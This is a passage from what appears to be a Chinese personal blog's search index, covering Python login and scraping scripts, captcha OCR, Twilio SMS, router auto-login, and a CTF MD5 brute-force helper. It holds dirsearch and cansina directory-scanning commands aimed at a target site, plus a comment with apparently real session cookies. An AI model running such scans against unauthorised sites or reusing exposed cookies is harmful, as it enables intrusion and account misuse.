&apos;validateCode&apos;:&apos;true&apos;, &apos;rtnJson&apos;:&apos;true&apos;,&#125; 因为是先POST去 /getRsaOfKey.action拿到加密后的password，然后POST /Login.action 所以我直接request请求/Login.action 然后再request一下自己的主页看看登录次数 检查一下当前的登录次数：264 运行代码： 再运行一次： 登录成功了，以后登录就只需要运行下面短短20行左右代码，感谢合天小姐姐提醒我填了这个坑 123456789101112131415161718192021222324252627282930313233#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/24 13:02# @Author : Lhaihai# @File : Request模拟登陆xxxx.py# @Software: PyCharm""" Description : 使用request来登陆"""import requestsfrom bs4 import BeautifulSoupdatas=&#123; 'username':'xxxxxxxxxxxxx', 'password':'xxxxxxxxxxxxxxxxxxxxxxxxx', 'validateCode':'true', 'rtnJson':'true',&#125;url = 'http://www.xxxxxxx.com/Login.action'myindexUrl = 'http://www.xxxxxxxx.com/profile.do?u=xxxxxxxxxxxx' #我的主页urlsession = requests.session()#模拟登陆r = session.post(url,data=datas)#输出响应报文状态码print(r.status_code)#请求访问主页r2 = session.get(myindexUrl)bs = BeautifulSoup(r2.text,'lxml')for Msg in bs.find_all(class_='logoRight'): for ms in Msg.find_all(name='p'): print(ms.string) 写得挺长的，或许有些错误。虚心请教各位大表哥，如果发现错误，请指点一下小弟。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬取ichunqiu的课程列表]]></title>
    <url>%2F2018%2F04%2F16%2F%E7%88%AC%E5%8F%96ichunqiu%E7%9A%84%E8%AF%BE%E7%A8%8B%E5%88%97%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[0x00 模拟浏览器登录0x01 爬取课程数据0x02 把课程数据保存在Excel表格爬取了ichunqiu的全部课程，把课程名字，费用，课程时间，学习人数保存到Excel表格里 最后统计了一下，如果购买ichunqiu的全部360门课程，需要 13835 元，好贵，可恶。还好强网杯送了VIP 每门课的学习人数加起来有 ： 20338110 对你没看错，两千多万，:-( 看来很多大表哥都在认真学习，我需要继续加油 现在有点晚了，有空再详细写一下 把代码奉上:） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 20:04# @Author : Lhaihai# @File : 爬取ichunqiu的课程.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 看了ADO大哥的Python视频，特来练练手"""import timefrom selenium import webdriverfrom selenium.webdriver.chrome.options import Optionsimport openpyxldef main(): url = 'https://user.ichunqiu.com/login?r=https%3A%2F%2Fwww.ichunqiu.com%2F' chrome_options = Options() chrome_options.add_argument('--headless') chrome_options.add_argument('--disable-gpu') browser = webdriver.Edge() browser.maximize_window() browser.implicitly_wait(10) browser.get(url) phonenumber = browser.find_element_by_id('username') phonenumber.send_keys('132xxxxxxxx') #ichunqiu用户名 password = browser.find_element_by_id('password') password.send_keys('xxxxxxxx') #密码 siginbutton = browser.find_elements_by_tag_name('button') siginbutton[1].click() zhishitixi = browser.find_element_by_link_text('知识体系') zhishitixi.click() pagesizetext = browser.find_element_by_class_name('paginmsg') pagesize = int(pagesizetext.text[1:3]) print(pagesize) time.sleep(5) fileName = 'ichunqiuCourse.xlsx' wb = openpyxl.load_workbook(fileName) sheet = wb['Sheet1'] coursenum = 1 for i in range(pagesize): print('第%s页：'%(i+1)) try: courses = browser.find_elements_by_class_name('coursedesc') except: courses = browser.find_elements_by_class_name('coursedesc') for course in courses: coursenum += 1 temp = str(course.text).split('\n') q = 0 for k in ['A','B','C','D']: sheet[k+str(coursenum)]=temp[q] q +=1 print(temp[0]+' '+temp[1]+' '+temp[2]+' '+temp[3]) time.sleep(30) forward = browser.find_element_by_link_text('下一页') forward.click() wb.save(fileName) time.sleep(10) browser.close() # headers = &#123; # 'Host': 'www.ichunqiu.com', # 'Upgrade-Insecure - Requests': '1', # 'User-Agent': 'Mozilla / 5.0(Windows NT 10.0; WOW64) AppleWebKit / 537.36(KHTML, like Gecko) Chrome / 65.0 .3325 .162 Safari / 537.36', # 'Cookie':'jsluid = db12a88242060be7332ceb595406d146; UM_distinctid = 160 f2bab2de3e - 075 c93693782be - 5 a442916 - 144000 - 160 f2bab2df60c; pgv_pvi = 3608032256; chkphone = acWxNpxhQpDiAchhNuSnEqyiQuDIO0O0O; bdshare_firstime = 1523760890619; CNZZDATA1262179648 = 1767882761 - 1515897679 - https % 253 A % 252 F % 252 Fwww.baidu.com % 252 F % 7 C1523878517; pgv_si = s8916923392; Hm_lvt_2d0601bd28de7d49818249cf35d95943 = 1523684986, 1523758601, 1523780794, 1523879628; robot = 1; Hm_lvt_9104989ce242a8e03049eaceca950328 = 1523512155, 1523544753, 1523758659, 1523879645; Hm_lpvt_9104989ce242a8e03049eaceca950328 = 1523879645; Hm_lvt_1a32f7c660491887db0960e9c314b022 = 1523512155, 1523544754, 1523758659, 1523879645; Hm_lpvt_1a32f7c660491887db0960e9c314b022 = 1523879645; browse = CFlZTVQKAE9cU1FMW0oaT1haUldcQVhNRFNbWFxBSUdaWVxAVEBbV1IKUkBYQFxGUhBSRFdLS0dZUlBYXkJER1lDWkZURVxPWldKTgdLXE1dUV9OHUtYTFNBWkVfSURFXU5YTU5BUE9dW1JEXVNSHFNWWUVYSFIGU1JRT0xDWURRTlhGQ0NQVVlTUkVdS1tDS1gBT1tGUUJQWBtPX0hTV1tTWU1DQV1YWFRIRFdLXEFTV1xXVRhTQFhXWEBVAlNEUFlKR15AUVhZV0VFVlFbRFNWUU9fQ0tOAFldRlpCXk4aWVlMVFNbRVhbRUVaXFhCSVFYT15EU0FfQVMcVERdRVBQUwZUQFBPS1FYRFZcWUFEUl5VX0FTQF1ZWkVMSgBPXFVRRF9KGk9YWlJXXEFYTURTXFheSElEWllbRVRFXVdSClJAVkJaRlIQUkRXS0tHWVJQWF5FRERYQ1pFVEBQT1hWSk4HS1xNXlpRTh1LWExTQVpFX0lERV1OWUVOQFxPWFZSQFdTUhxTVFBOHUtYTFNBWkVfSURFXU5ZRU5AXE9YVVJBWFNSHFNXX0BVAlNEUFlKR15AUVhZV0VEXlFbRFNWXk9eQUtOAFldQVlCXE4aWVlMVFNbRVhbRUVaXFhFSVFZT1tHU0VdQVMcVERRQVhWUwZUQFBPS1FYRFZcWUFEUllVX0NTRl1ZWkVMSgBPX1JbTV1KGk9YWlJXXEFYTURTXFhfQ0lEXVlZRFRFXVdSClJDX0ReQlIQUkRXS0tHWVJQWF5FRERaQ1lGVEVQT1tWSk4HS19EX1dRTh1LWExTQVpFX0lERV1OWUNOQFlPWlZSRFhTUgg; ci_session = 61 ef25a31707ca2e4aca5c072f778ef4068bcd64; Hm_lpvt_2d0601bd28de7d49818249cf35d95943 = 1523880868' # &#125; # # r = requests.get(url) # r.status_code # r.encoding = 'utf-8' # print(r.text)if __name__ == '__main__': main()]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['python操作Excel']]></title>
    <url>%2F2018%2F04%2F16%2Fpython%E6%93%8D%E4%BD%9CExcel%2F</url>
    <content type="text"><![CDATA[0x00 安装openpyxlpip install openpyxl 我直接使用pycharm在当前项目安装了 0x01 读写Excel打开Excel文档1wb = openpyxl.load_workbook('ichunqiuCourse.xlsx') 取得工作表123wb.sheetnames #获得Excel每个表的名字sheet = wb['Sheet1'] #获得工作表，对工作表进行操作print(sheet['A1'].value) #获得Sheet1表格A1单元格的值 测试下面代码 12345678import openpyxlwb = openpyxl.load_workbook(&apos;ichunqiuCourse.xlsx&apos;)print(&apos;Excle的工作表有：&apos;+str(wb.sheetnames))sheet = wb[&apos;Sheet1&apos;]for i in [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;D&apos;]: print(sheet[str(i)+&apos;1&apos;].value+&apos;:&apos;+sheet[str(i)+&apos;2&apos;].value) 向Excel写入数据12345sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 成功写入数据 0x02完整代码 123456789101112131415161718192021222324#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2018/4/16 22:08# @Author : Lhaihai# @File : controlExcel.py# @Software: PyCharm# @Blog : http://blog.Lhaihai.wang""" Description : 使用python读写Excel"""import openpyxlwb = openpyxl.load_workbook('ichunqiuCourse.xlsx')print('Excle的工作表有：'+str(wb.sheetnames))sheet = wb['Sheet1']for i in ['A','B','C','D']: print(sheet[str(i)+'1'].value+':'+sheet[str(i)+'2'].value)sheet['A3']= '社工情报侦察神器——Maltego'sheet['B3']= '免费'sheet['C3']= '7课时174分钟'sheet['D3']= '25651人学习'wb.save('ichunqiuCourse.xlsx') 注意：我看的《Python编程快速上手——让繁琐工作自动化》这本书，也许是这本书有点旧了，里面刚开始用的是 get_sheet_names 和get_sheet_by_name ，但是PyCharm会warning，提示建议使用 wb.sheetnames和wb[sheetname] 123DeprecationWarning: Call to deprecated function get_sheet_names (Use wb.sheetnames)DeprecationWarning: Call to deprecated function get_sheet_by_name (Use wb[sheetname]). 我搜到有人使用xlrd、xlwt包来操作Excel，但http://www.python-excel.org/推荐使用`openpyxl` 我也推荐用openpyxl ，因为它比那两个包方便很多。 至于一些字体大小也颜色也是可以设置的，就不写了，如果要用到就翻书吧。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA['小米路由器开机自动登录Dr.COM']]></title>
    <url>%2F2018%2F04%2F16%2F%E5%B0%8F%E7%B1%B3%E8%B7%AF%E7%94%B1%E5%99%A8%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95Dr-COM%2F</url>
    <content type="text"><![CDATA[0x00 小米路由开启SSH访问1.检查是否为开发版 2.如果不是开发版，到下面网址下在rom升级http://www1.miwifi.com/miwifi_download.html next 3.然后网页打开http://miwifi.com/cgi-bin/luci/web 进入管理页面手动升级 4.给小米路由安装SSH管理工具，具体看下面这篇百度经验，还是挺容易的https://jingyan.baidu.com/article/a24b33cd1080f719fe002b8e.html 注意：​ 在用SSH连接小米路由器时，不同路由器的IP地址可能不同，查看小米路由器的，下图圈起来来的IP地址就是SSH登录时的服务器IP，用户名是：root，密码：下载小米路由器SSH工具的页面有 0x01 测试Dr.com具体步骤查看下方网址： https://github.com/drcoms/drcom-generic/wiki/d%E7%89%88%E7%AE%80%E7%95%A5%E4%BD%BF%E7%94%A8%E5%92%8C%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E 1.使用wireshark在官方客户端登录前开始截包，做一次完整的截包动作然后登出，保存为 wireshark截包文件, 比如 dr.pcapng (扩展名为pcapng)。 2.下载 d版配置生成器, 将其与第一步的截包文件放到同一个目录下，并且将第17行的 filename = &#39;3.pcapng&#39; 中的 dr.pcapng 改为第一步保存的文件名。 3.进入命令提示符(或shell)进入 drcom_d_config.py 所在目录，输入 python drcom_d_config.py &gt; config.txt ，打开 config.txt 根据提示，新建drcom.conf文件，复制类在似下方段落保存在drcom.conf文件中 123456789101112131415server = &apos;119.39.119.2&apos; //服务器ip地址username=&apos;02xxxxxxxxx@zndx&apos; //xxx是你的学号password=&apos;&apos;CONTROLCHECKSTATUS = &apos;\x20&apos;ADAPTERNUM = &apos;\x08&apos;host_ip = &apos;10.0.7.24&apos; //小米路由器的ip地址IPDOG = &apos;\x01&apos;host_name = &apos;GILIGILIEYE&apos;PRIMARY_DNS = &apos;192.168.31.1&apos;dhcp_server = &apos;0.0.0.0&apos;AUTH_VERSION = &apos;\x2d\x00&apos;mac = 0x000000000000host_os = &apos;NOTE7&apos;KEEP_ALIVE_VERSION = &apos;\xd8\x02&apos;ror_version = True 4.在自己电脑测试 保存https://github.com/drcoms/drcom-generic项目的latest-wired.py 到自己电脑（发现原来有python3版本的呀，苦逼的我为了用python2特地修改了下系统环境变量） 注意latest-wired.py使用python2执行，latest-wired-python3.py应该可以用python3执行，看官可以自己试一下，我没有测试。 傻傻的我直接打在windows打linux命令了 改一改绑定的端口就可以了，在73行 看到类似提示，那就是可以用了，这时候并没有成功连接Dr.com的服务器，因为我这是候还没有在drcom.conf配置文件的password打上我联通账号的密码。将 latest-wired.py 改名为 drcom.py 接下来就到小米路由器上测试了。 0x02设置小米路由器开机启动Dr.com下方网址的大哥写得很详细了，我就补充一下一些需要注意的地方： http://bbs.xiaomi.cn/t-12871940 1.配置开机自动运行 Dr. COM 登录脚本/etc/inittab可以使用WinSCP直接操作，不熟悉vim命令的话 使用vim的过程十分痛苦（有点反人类）,复制::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 到inittab最后一行，Ctrl+S保存，退出 2.放配置文件 0x03 效果reboot路由器后，ps查看。等个几秒钟，就连上网了 0x04 后记昨晚弄好没有问题，早上起来用手机连上WiFi又弹出联通页面了。 putty连接小米路由器（小强root@XiaoQiang:~#)，刚开始我以为是联通服务器有问题掉线了，我偶尔遇到过Dr.com客户端断开连接，然后reboot重启下路由器。 再ps查看一下，咦，怎么没有我可爱的python进程（登录哆点的脚本） 最后检查了etc/inittab，没错就是添加 ::respawn:/data/python/usr/bin/python /data/python/usr/bin/drcom.py 这条语句的文件，发现这条语句没了，emmmm 加上去，再reboot一下就连上网了。 我猜可能是路由器自动恢复？还是刚好被我遇到了这个奇葩bug？ 后续想着设置一下每天自动执行 killall python，Linux是有cron个工具，类似于windows的task scheduler，可以设置定时启动某任务。]]></content>
      <categories>
        <category>趣味玩耍</category>
      </categories>
      <tags>
        <tag>小米路由器</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python识别验证码]]></title>
    <url>%2F2018%2F04%2F15%2Fpython%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[0x00 安装环境OCR(Optical Character Recognition): 光学字符识别,是指对图片文件中的文字进行分析识别，获取的过程。 Tesseract： 开源的OCR识别引擎，初期Tesseract引擎由HP实验室研发，后来贡献给了开源软件业，后经由Google进行改进，消除bug，优化，重新发布。当前版本为4.0 (安装教程是从这复制来的：http://www.inimei.cn/archives/297.html) 首先需要安装pytesseract库还有图像处理的PILLOW库了 12pip install pytesseractpip install PILLOW 然后要安装一个Tesseract-OCR软件。这个软件是由Google维护的开源的OCR软件。下载地址：百度网盘（密码：5m3d）。再在Windows下配置一下环境变量。 0x01报错：FileNotFoundError: [WinError 2] 系统找不到指定的文件。https://blog.csdn.net/jacke121/article/details/75443785 1pytesseract.pytesseract.tesseract_cmd = r&apos;C:\Program Files (x86)\Tesseract-OCR\tesseract.exe&apos; 0x02 报错：pytesseract.pytesseract.TesseractError: (1, ‘Error opening data file \Program Files (x86)\Tesseract-OCR\eng.traineddata1pytesseract.pytesseract.TesseractError: (1, &apos;Error opening data file \\Program Files (x86)\\Tesseract-OCR\\eng.traineddata Please make sure the TESSDATA_PREFIX environment variable is set to your &quot;tessdata&quot; directory. Failed loading language \&apos;eng\&apos; Tesseract couldn\&apos;t load any languages! Could not initialize tesseract.&apos;) 在.py 文件配置中指定 tessdata-dir 12tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"'text = pytesseract.image_to_string(image,lang='chi_sim',config=tessdata_dir_config) 0x03 供上代码12345678910111213141516171819202122232425262728293031323334353637383940#!/usr/bin/env python3# -*- coding: utf-8 -*-# @Date : 2018-04-15 13:18:36# @Author : Lhaihai ($&#123;email&#125;)# @Link : http://blog.Lhaihai.wang# @Version : $Id$import pytesseractfrom PIL import Imagedef get_bin_table(threshold = 230): # 获取灰度转二值的映射table table = [] for i in range(256): if i &lt; threshold: table.append(0) else: table.append(1) return tabledef main(): pytesseract.pytesseract.tesseract_cmd = r'D:\Program Files (x86)\Tesseract-OCR\tesseract.exe' image = Image.open('1.jpg') # image.show() #打开图片1.jpg #imgry = image.convert('L') # 转化为灰度图，虽然说转为灰度图识别更好的一点，但随你喜欢用不用 #table = get_bin_table() #out = imgry.point(table, '1') tessdata_dir_config = '--tessdata-dir "D:\\Program Files (x86)\\Tesseract-OCR\\tessdata"' text = pytesseract.image_to_string(image,lang='eng',config=tessdata_dir_config) # fil = filter(str.isdigit, text) # new_text = '' # for i in fil: # new_text += i print(text)if __name__ == '__main__': main() 有时候可以识别出来，有时候识别不了，时好时坏吧 参考地址： https://blog.csdn.net/Sioon_XUX/article/details/78617160 http://www.cnblogs.com/zhongtang/tag/%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB/ https://blog.csdn.net/kiramario/article/details/53781369 https://github.com/tesseract-ocr/tesseract/wiki/4.0-with-LSTM#400-alpha-for-windows https://github.com/tesseract-ocr/tesseract/wiki/Data-Files https://github.com/madmaze/pytesseract https://github.com/tesseract-ocr/tesseract https://github.com/tesseract-ocr/tesseract/wiki]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python+twilio发送短信]]></title>
    <url>%2F2018%2F04%2F14%2Fpython-twilio%E5%8F%91%E9%80%81%E7%9F%AD%E4%BF%A1%2F</url>
    <content type="text"><![CDATA[注册Twilio账号访问http://twilio.com/并填写注册表单。注册了新账户后，你需要验证一个手机号码，短信将发给该号码（这项验证是必要的，防止有人利用该服务向任意的手机号码发送垃圾短信）。收到验证号码短信后，在Twilio网站上输入它，证明你拥有要验证的手机。现在，就可以用twilio模块向这个电话号码发送短信了。 1、获取一个Twilio电话号码：https://support.twilio.com/hc/en-us/articles/223136107-How-does-Twilio-s-Free-Trial-work-/ 2、要验证接收短信的手机号码，要不然就会报错1twilio.base.exceptions.TwilioRestException: HTTP 400 error: Unable to create record: The number +8613xxxxxx30 is unverified. Trial accounts cannot send messages to unverified numbers; verify +8613xxxxxx30 at twilio.com/user/account/phone-numbers/verified, or purchase a Twilio number to send messages to unverified numbers. 到这个网址验证手机号码：https://www.twilio.com/console/phone-numbers/verified 可以发送短信验证码或者打电话输入验证码 3、官方文档https://www.twilio.com/docs/libraries/python 发送短信123456789101112131415from twilio.rest import Client# Your Account SID from twilio.com/consoleaccount_sid = "AC9810ae2342f0014cd05e338bce9be8cb"# Your Auth Token from twilio.com/consoleauth_token = "your_auth_token"client = Client(account_sid, auth_token)message = client.messages.create( to="+15558675309", from_="+15017250604", body="Hello from Python!")print(message.sid) 效果如下： tip1:to=”+15558675309” to的值是接收短信的手机号码，注意的是，中国大陆的电话号码要在前面加上+86 tip2：python文件的命名不能是twilio.py 如果你像我一样给它这样命名，在导入twilio库的时候会失败，提示unuseful rest 哈哈，宛如一个智障（自我嘲讽一波） 找找stackoverflow.com发现下面这个： https://stackoverflow.com/questions/41013556/importerror-cannot-import-name-twiliorestclient tip3:封装一下函数，（并且放在python.exe当前目录，方便其它python文件调用），就方便使用了 1sendMessage('tophonenumber','Happy to do this') tip4：github项目 https://github.com/twilio/twilio-python/ 打电话12345678910from twilio.rest import Clientaccount = "ACXXXXXXXXXXXXXXXXX"token = "YYYYYYYYYYYYYYYYYY"client = Client(account, token)call = client.calls.create(to="9991231234", from_="9991231234", url="http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient")print(call.sid) 只能打电话过来，说几句英语，不能沟通 Handling a call using TwiML（偷个懒直接从github复制） To control phone calls, your application needs to output TwiML. Use twilio.twiml.Response to easily create such responses. 12345from twilio.twiml.voice_response import VoiceResponser = VoiceResponse()r.say("Welcome to twilio!")print(str(r)) 最后还是不知道怎么实现打电话双向通话(；へ：) 参考链接： https://baijiahao.baidu.com/s?id=1593431889367189831&amp;wfr=spider&amp;for=pc]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo 学习笔记]]></title>
    <url>%2F2018%2F04%2F13%2Fhexo-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[参考链接： Hexo博客教程(一):Hexo的前期部署：https://www.jianshu.com/p/9f04ee6371ce Hexo博客教程(二):基本功能和网站优化：https://www.jianshu.com/p/2a70262295e4 Hexo博客教程(三):参考资料https://www.jianshu.com/p/8f727b4c3cd1 设置访问次数统计不蒜子统计 http://theme-next.iissnan.com/third-party-services.html#analytics-busuanzi]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F13%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>good</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[网站目录结构扫描器]]></title>
    <url>%2F2018%2F03%2F13%2F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E6%89%AB%E6%8F%8F%E5%99%A8%2F</url>
    <content type="text"><![CDATA[0x00 cansinaInstall12345pip install --user requests[security](try removing --user and install with sudo in case of errors)git clone --depth=1 https://github.com/deibit/cansina Fast useUse Python 3 (works on Python 2 too, but 3 is advisable) 1$ python3 cansina.py -u &lt;site_url&gt; -p &lt;payload_file&gt; 0x01 dirsearchinstall(need Python 3.X)Linux: 123git clone https://github.com/maurosoria/dirsearch.gitcd dirsearch/./dirsearch.py -u 目标网址 -e * Windows: https://github.com/maurosoria/dirsearch/archive/master.zip Fast use12./dirsearch.py -u 目标网址 -e *./dirsearch.py -u 目标网址 -e php| grep 200 !dirsearch]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>python Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF笔记]]></title>
    <url>%2F2018%2F03%2F11%2FN1CTF%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[https://3wapp.github.io/ http://blog.csdn.net/lacoucou/article/details/72355346 Dockerfile easy php substr(md5(?), 0, 5)=== de426 substr() 函数返回字符串的一部分。 注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 语法12substr(string,start,length) 参数 描述 string 必需。规定要返回其中一部分的字符串。 start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始 length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 http://www.beesfun.com/2017/03/21/CTF%E4%B9%8BMD5%E6%88%AA%E6%96%AD%E6%AF%94%E8%BE%83/ submd5.py 12345678910111213141516171819202122232425262728# -*- coding: utf-8 -*-import multiprocessingimport hashlibimport randomimport stringimport sysCHARS = string.letters + string.digitsdef cmp_md5(substr, stop_event, str_len, start=0, size=20): global CHARS while not stop_event.is_set(): rnds = ''.join(random.choice(CHARS) for _ in range(size)) md5 = hashlib.md5(rnds) if md5.hexdigest()[start: start+str_len] == substr: print rnds stop_event.set()if __name__ == '__main__': substr = sys.argv[1].strip() start_pos = int(sys.argv[2]) if len(sys.argv) &gt; 1 else 0 str_len = len(substr) cpus = multiprocessing.cpu_count() stop_event = multiprocessing.Event() processes = [multiprocessing.Process(target=cmp_md5, args=(substr, stop_event, str_len, start_pos)) for i in range(cpus)] for p in processes: p.start() for p in processes: p.join() 用法： 1234$ python submd5.py "3d4f4"SponhjOhIZ30IaM1fweb$ python submd5.py "3df4" 2G8tr6VhonA1z3xJdaGBu]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GitHub hexo建站笔记]]></title>
    <url>%2F2018%2F03%2F11%2FGitHub-hexo%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[有用的链接：12https://github.com/iissnan/hexo-theme-next/blob/master/README.cn.mdhttp://theme-next.iissnan.com/getting-started.html 0x01 Cannot GET /tags/执行 1$ hexo new page tags 之后，要修改tags文件下的index.md文件 https://www.zhihu.com/question/29017171 0x02 这里有两篇帮你不需要什么成本，搭建好一个功能完备的博客： 如何搭建一个独立博客——简明Github Pages与Hexo教程 https://www.jianshu.com/p/05289a4bc8b2 hexo 博客小功能添加-评论、相册、字数统计… https://www.jianshu.com/p/f5c184047e72]]></content>
      <categories>
        <category>GitHub hexo建站</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
